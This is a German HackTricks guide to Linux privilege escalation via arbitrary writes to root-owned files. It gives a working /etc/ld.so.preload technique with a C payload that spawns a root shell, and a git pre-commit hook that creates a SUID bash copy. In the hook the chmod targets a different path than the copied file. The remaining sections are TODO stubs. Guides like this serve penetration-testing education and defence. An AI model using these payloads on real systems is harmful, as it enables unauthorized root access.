# Beliebiges Schreiben in die Root-Datei

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

### /etc/ld.so.preload

Diese Datei verhält sich wie die **`LD_PRELOAD`** Umgebungsvariable, funktioniert aber auch in **SUID-Binärdateien**.\
Wenn Sie sie erstellen oder ändern können, können Sie einfach einen **Pfad zu einer Bibliothek hinzufügen, die mit jeder ausgeführten Binärdatei geladen wird**.

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git Hooks

[**Git Hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sind **Skripte**, die bei verschiedenen **Ereignissen** in einem Git-Repository ausgeführt werden, z. B. wenn ein Commit erstellt wird, ein Merge... Wenn also ein **privilegiertes Skript oder Benutzer** diese Aktionen häufig ausführt und es möglich ist, im `.git`-Ordner zu **schreiben**, kann dies zur **Privilege Escalation** verwendet werden.

Zum Beispiel ist es möglich, ein Skript in einem Git-Repository im **`.git/hooks`** zu **generieren**, damit es immer ausgeführt wird, wenn ein neuer Commit erstellt wird:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Zeitdateien

TODO

### Service- & Socketdateien

TODO

### binfmt\_misc

Die Datei in `/proc/sys/fs/binfmt_misc` gibt an, welche Binärdatei welche Art von Dateien ausführen soll. TODO: Überprüfen Sie die Anforderungen, um dies auszunutzen und eine Reverse-Shell auszuführen, wenn ein gängiger Dateityp geöffnet wird.
